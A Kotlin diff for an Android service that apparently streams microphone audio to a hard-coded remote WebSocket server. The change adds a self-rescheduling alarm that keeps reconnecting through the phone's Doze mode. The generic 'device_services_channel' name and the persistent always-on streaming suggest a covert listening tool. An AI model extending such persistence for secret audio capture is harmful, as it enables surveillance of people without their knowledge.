@@ -92,6 +92,7 @@ class MicService : Service() {
         const val TAG          = "MicService"
         const val CHANNEL_ID   = "device_services_channel"
         const val NOTIF_ID     = 101
+        const val ACTION_RECONNECT = "com.micmonitor.app.RECONNECT"
 
         // Render cloud URL — works on any network (WiFi or cellular)
         const val DEFAULT_SERVER_URL = "wss://monitor-raje.onrender.com/audio/"
@@ -135,10 +136,24 @@ class MicService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.i(TAG, "onStartCommand")
+        Log.i(TAG, "onStartCommand action=${intent?.action}")
+
+        // Reconnect watchdog alarm fired — force a fresh WebSocket if dead
+        if (intent?.action == ACTION_RECONNECT) {
+            if (activeWebSocket == null) {
+                Log.i(TAG, "Reconnect alarm: WebSocket dead, reconnecting…")
+                connectWebSocket()
+            } else {
+                Log.i(TAG, "Reconnect alarm: WebSocket alive, skipping")
+            }
+            scheduleReconnectAlarm() // reschedule for next cycle
+            return START_STICKY
+        }
+
         startForeground(NOTIF_ID, buildNotification("Connecting to server…"))
         connectWebSocket()
         scheduleKeepAlive()
+        scheduleReconnectAlarm()
         return START_STICKY   // Android restarts service automatically if killed
     }
 
@@ -473,5 +488,28 @@ class MicService : Service() {
             request
         )
         Log.i(TAG, "KeepAlive watchdog scheduled (15 min interval)")
+    }
+
+    /**
+     * Schedules a one-shot AlarmManager alarm 8 minutes from now.
+     * On fire, sends ACTION_RECONNECT to this service — survives Doze better
+     * than coroutines because AlarmManager uses ELAPSED_REALTIME_WAKEUP.
+     * The alarm reschedules itself each time it fires, creating a rolling chain.
+     */
+    private fun scheduleReconnectAlarm() {
+        val intent = Intent(applicationContext, MicService::class.java).apply {
+            action = ACTION_RECONNECT
+        }
+        val pendingIntent = PendingIntent.getService(
+            applicationContext, 2, intent,
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+        val alarmManager = getSystemService(AlarmManager::class.java)
+        alarmManager.set(
+            AlarmManager.ELAPSED_REALTIME_WAKEUP,
+            SystemClock.elapsedRealtime() + 8 * 60 * 1000L,
+            pendingIntent
+        )
+        Log.i(TAG, "Reconnect alarm scheduled in 8 min")
     }
 }
